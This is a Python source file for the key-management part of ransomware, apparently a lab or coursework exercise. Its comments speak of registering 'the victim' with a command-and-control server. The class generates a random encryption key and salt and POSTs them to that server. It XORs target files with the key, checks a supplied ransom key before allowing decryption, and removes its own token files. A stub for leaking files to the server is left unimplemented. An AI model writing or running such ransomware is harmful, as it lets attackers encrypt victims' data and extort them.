from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64
import json

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root",token_path:str="/root/token") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None
        self._token_path = token_path

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        # Key derivation with PBKDF2HMAC and hashes.SHA256
        # return a 32 bytes key
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
        )
        return kdf.derive(key)


    def create(self)->Tuple[bytes, bytes, bytes]:
        # generate salt with random bytes   
        salt = secrets.token_bytes(self.SALT_LENGTH)
        
        # generate key with random bytes
        key = secrets.token_bytes(self.KEY_LENGTH)
        
        #generate a token with the key and the salt
        token = self.do_derivation(salt, key)
        
        # return the salt, the key and the token
        return salt, key, token



    def bin_to_b64(self, data:bytes)->str:
        # encode bytes to b64
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        #create a json with the salt, key and token
        data = {
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key),
            "token": self.bin_to_b64(token),
        }
        #convert the json to string
        data=json.dumps(data)
        #try to send the data to the cn, if it's not possible, raise a connection error
        try:
            r = requests.post(f"http://{self._remote_host_port}/new", data=data,headers={'Content-Type': 'application/json'})
            #check if the status code is 200 (OK) if not raise an exception
            if r.status_code != 200:
                raise ConnectionError("Bad status code")
        except Exception as e:
            raise ConnectionError("Connection error")

    def setup(self)->None:
        #if token.bin not exist inside /root/token/ create a new one else raise an exception
        if not os.path.exists(self._token_path): os.mkdir(self._token_path)
        else : raise FileExistsError("token.bin already exist")
        #create a new salt, key and token
        salt,key,token =self.create()
        self._key=key
        self._salt=salt
        self._token=token
        #try to send the data to the cn, if it's not possible clean and raise an exception
        try: self.post_new(salt, key, token)
        except ConnectionError as e: 
            self.clean()
            raise e
        # save token, salt
        path = os.path.join(self._token_path, "token.bin")
        with open(path, "wb") as f:
            f.write(token)
        path = os.path.join(self._token_path, "salt.bin")
        with open(path, "wb") as f:
            f.write(salt)

    def load(self)->None:
        # function to load crypto data
        #retrieve the token and the salt from the token.bin and salt.bin
        #read the salt from /root/token/salt.bin
        path = os.path.join(self._token_path, "salt.bin")
        with open(path, "rb") as f:
            salt = f.read()
        
        #read the token from /root/token/token.bin
        path = os.path.join(self._token_path, "token.bin")
        with open(path, "rb") as f:
            token = f.read()
            
        #set the salt and the token
        self._salt=salt
        self._token=token
        
        return
        

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid

        # generate a token with the salt and the candidate key
        token = self.do_derivation(self._salt, candidate_key)
        
        # compare the token with the token.bin
        if token == self._token:
            return True
        else:
            return False


    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting

        # decode the b64_key
        key = base64.b64decode(b64_key)
        
        # check if the key is valid if not raise an exception
        if self.check_key(key):
            self._key = key
        else:
            raise Exception("Invalid key")

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        return str(self._token.hex())

    def xorfiles(self, files:List[str])->None:
        # xor a list for file with the key

        for file in files:
            xorfile(file, self._key)

        return


    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        # try to remove the token.bin if it's not possible pass
        try:
            path = os.path.join(self._token_path, "token.bin")
            os.remove(path)
        except: pass
        
        # try to remove the salt.bin if it's not possible pass
        try:
            path = os.path.join(self._token_path, "salt.bin")
            os.remove(path)
        except: pass
        
        #try to remove the /root/token/ if it's not possible pass
        try:
            os.rmdir(self._token_path)
        except:pass
        
        return